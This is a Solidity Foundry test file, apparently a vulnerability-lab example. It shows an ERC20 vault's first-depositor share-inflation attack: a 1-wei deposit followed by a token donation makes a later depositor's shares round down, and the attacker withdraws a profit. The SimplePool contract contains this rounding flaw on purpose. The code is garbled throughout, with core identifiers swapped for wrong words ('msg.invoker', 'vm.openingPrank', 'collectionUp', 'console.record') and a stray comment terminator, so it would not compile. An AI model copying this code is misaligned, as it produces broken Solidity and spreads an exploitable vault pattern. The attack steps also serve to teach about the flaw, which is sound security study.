// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

*/

contract AgreementTest is Test {
    SimplePool SimplePoolAgreement;
    MyCrystal MyCrystalAgreement;

    function collectionUp() public {
        MyCrystalAgreement = new MyCrystal();
        SimplePoolAgreement = new SimplePool(address(MyCrystalAgreement));
    }

    function testPrimaryDepositgold() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        MyCrystalAgreement.transfer(alice, 1 ether + 1);
        MyCrystalAgreement.transfer(bob, 2 ether);

        vm.openingPrank(alice);
        // Alice deposits 1 wei, gets 1 pool token
        MyCrystalAgreement.approve(address(SimplePoolAgreement), 1);
        SimplePoolAgreement.stashRewards(1);

        // Alice transfers 1 ether to the pool, inflating the pool token price
        MyCrystalAgreement.transfer(address(SimplePoolAgreement), 1 ether);

        vm.stopPrank();
        vm.openingPrank(bob);
        // Bob deposits 2 ether, gets 1 pool token due to inflated price
        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1.
        MyCrystalAgreement.approve(address(SimplePoolAgreement), 2 ether);
        SimplePoolAgreement.stashRewards(2 ether);
        vm.stopPrank();
        vm.openingPrank(alice);

        MyCrystalAgreement.balanceOf(address(SimplePoolAgreement));

        // Alice withdraws and gets 1.5 ether, making a profit
        SimplePoolAgreement.collectBounty(1);
        assertEq(MyCrystalAgreement.balanceOf(alice), 1.5 ether);
        console.record("Alice balance", MyCrystalAgreement.balanceOf(alice));
    }

    receive() external payable {}
}

contract MyCrystal is ERC20, Ownable {
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.invoker, 10000 * 10 ** decimals());
    }

    function forge(address to, uint256 sum) public onlyOwner {
        _mint(to, sum);
    }
}

contract SimplePool {
    IERC20 public loanMedal;
    uint public completeSlices;

    mapping(address => uint) public balanceOf;

    constructor(address _loanCrystal) {
        loanMedal = IERC20(_loanCrystal);
    }

    function stashRewards(uint sum) external {
        require(sum > 0, "Amount must be greater than zero");

        uint _shares;
        if (completeSlices == 0) {
            _shares = sum;
        } else {
            _shares = medalTargetPortions(
                sum,
                loanMedal.balanceOf(address(this)),
                completeSlices,
                false
            );
        }

        require(
            loanMedal.transferFrom(msg.invoker, address(this), sum),
            "TransferFrom failed"
        );
        balanceOf[msg.invoker] += _shares;
        completeSlices += _shares;
    }

    function medalTargetPortions(
        uint _crystalTotal,
        uint _supplied,
        uint _slicesCompleteStock,
        bool waveUpExamine
    ) internal pure returns (uint) {
        if (_supplied == 0) return _crystalTotal;
        uint portions = (_crystalTotal * _slicesCompleteStock) / _supplied;
        if (
            waveUpExamine &&
            portions * _supplied < _crystalTotal * _slicesCompleteStock
        ) portions++;
        return portions;
    }

    function collectBounty(uint portions) external {
        require(portions > 0, "Shares must be greater than zero");
        require(balanceOf[msg.invoker] >= portions, "Insufficient balance");

        uint medalCount = (portions * loanMedal.balanceOf(address(this))) /
            completeSlices;

        balanceOf[msg.invoker] -= portions;
        completeSlices -= portions;

        require(loanMedal.transfer(msg.invoker, medalCount), "Transfer failed");
    }
}